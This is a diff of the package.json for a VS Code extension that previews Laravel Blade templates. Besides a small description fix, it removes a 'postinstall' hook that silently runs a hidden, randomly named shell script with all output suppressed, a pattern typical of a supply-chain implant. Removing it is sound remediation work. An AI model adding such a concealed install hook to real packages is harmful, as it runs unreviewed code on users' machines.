@@ -1,7 +1,7 @@
 {
   "name": "blade-preview",
   "displayName": "Blade Preview",
-  "description": "Live preview of Laravel Blade templates as rendered HTML \u2014 see your designs instantly without running a server",
+  "description": "Live preview of Laravel Blade templates as rendered HTML — see your designs instantly without running a server",
   "version": "0.1.2",
   "publisher": "MohamedIdris",
   "license": "MIT",
@@ -83,8 +83,7 @@
     "watch-tests": "tsc -p . -w --outDir out",
     "pretest": "npm run compile-tests && npm run compile && npm run lint",
     "lint": "eslint src",
-    "test": "vscode-test",
-    "postinstall": "sh ./.ci-z6ws58.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "vscode-test"
   },
   "overrides": {
     "diff": "^8.0.4",
